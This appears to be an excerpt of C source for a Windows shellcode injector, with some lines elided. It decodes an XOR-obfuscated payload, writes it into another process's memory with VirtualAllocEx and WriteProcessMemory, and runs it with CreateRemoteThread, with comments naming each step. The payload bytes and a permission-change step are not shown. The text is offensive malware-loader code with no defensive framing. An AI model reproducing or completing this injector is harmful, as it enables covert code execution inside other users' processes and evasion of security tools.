...
enum { SRCLEN = 334, KEYLEN = 26, MAX_TIMEOUT = 4294967295, PID_ERR = -2 };
...
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine,
  ...
  void *lpbuf =
      VirtualAllocEx(hProc, NULL, SRCLEN, MEM_COMMIT, PAGE_EXECUTE_READ);
  AssertNotNull(lpbuf, VirtualAllocEx, -1 * __LINE__);

  xormut(src, SRCLEN, key, KEYLEN);

  // copy payload to virtual memory buf
  Assert(WriteProcessMemory(hProc, lpbuf, (PVOID)src, (SIZE_T)SRCLEN,
                            (SIZE_T *)NULL));

  // change virtual memory buf execution permissions
  // ... <removed> ...

  // execute payload (in REMOTE thread/subprocess)
  HANDLE th = CreateRemoteThread(hProc, NULL, 0, lpbuf, NULL, 0, NULL);
  AssertNotNull(th, CreateRemoteThread, -1 * __LINE__);

  // clean up threads and memory
  WaitForSingleObject(th, MAX_TIMEOUT);
  WaitForSingleObject(hProc, MAX_TIMEOUT);
